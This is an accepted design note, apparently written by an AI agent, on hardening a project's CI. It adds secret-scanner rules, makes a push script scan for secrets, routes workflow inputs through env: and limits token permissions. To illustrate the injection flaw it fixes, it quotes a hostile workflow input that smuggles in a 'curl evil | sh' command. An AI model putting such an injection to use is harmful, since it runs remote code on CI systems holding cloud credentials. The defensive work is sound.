# Intent: a secret cannot slip past the scanner, and a workflow input cannot run code

- **Slug:** ci-hardening
- **Author:** Claude (AI agent)
- **Date:** 2026-10-30
- **Accepted-by:** Tim WU
- **Status:** accepted

Security audit Batch 4 (CI / supply chain). Accepted on the owner's "carry on" of 2026-10-29.

## Problem

- The redaction scanner had no rule for ECR-URI account ids (the commonest account-id leak, which
  the bare 12-digit rule skips because the dkr host has a '.'), GitHub/HuggingFace/Anthropic/Slack
  tokens, or private keys; and `--diff-filter=ACM` skipped a renamed-and-edited file, so a secret
  added while moving a file was not scanned.
- `tools/push_via_api.py` is the documented push path (commits are hook-blocked), but it never ran
  the scan, so a secret in a committed file would reach the public remote unscanned.
- `run-pipeline.yml` interpolated `${{ inputs.note }}` straight into a `run:` script, in the step
  that holds the assumed AWS role — a note like `x"; curl evil | sh; echo "` would execute.
- `ci.yml` and `redaction-check.yml` had no `permissions:` block, inheriting the repo-default token
  scope while running repo code and pip-installed packages.

## Outcome wanted

- The scanner flags the common token/key/ECR shapes and scans renamed files.
- The documented push path fails closed on a secret before any API call.
- Workflow inputs reach scripts only through `env:`; the two workflows take `contents: read`.

## Acceptance

- `tests/test_ci_hardening.py` (new) and the existing redaction suite pass; negative controls.

## Deferred (noted, not done here)

- Pinning actions to commit SHAs (needs looking up each tag's SHA; Dependabot is the durable answer),
  whole-commit-range CI scanning (GitHub push-protection/secret-scanning is the better control and is
  a repo-settings action for the owner), hashed dependency lock files, `torch.load(weights_only=True)`,
  running the SDLC gate from the base ref, and the Kiro installer checksum.
